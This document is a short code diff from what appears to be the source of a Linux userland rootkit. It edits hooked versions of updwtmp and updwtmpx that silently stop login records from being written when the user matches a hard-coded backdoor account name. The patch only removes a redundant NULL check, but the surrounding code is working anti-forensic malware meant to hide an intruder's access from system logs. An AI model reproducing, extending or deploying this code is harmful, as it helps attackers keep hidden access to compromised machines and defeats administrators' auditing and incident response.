@@ -37,7 +37,7 @@ void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host){
 void updwtmp(const char *wfile, const struct utmp *ut){
     if(hide_me) return;
 
-    if(ut && ut->ut_user != NULL){
+    if(ut){
         if(!strncmp(BD_UNAME, ut->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
             return;
@@ -51,7 +51,7 @@ void updwtmp(const char *wfile, const struct utmp *ut){
 void updwtmpx(const char *wfilex, const struct utmpx *utx){
     if(hide_me) return;
 
-    if(utx && utx->ut_user != NULL){
+    if(utx){
         if(!strncmp(BD_UNAME, utx->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
             return;
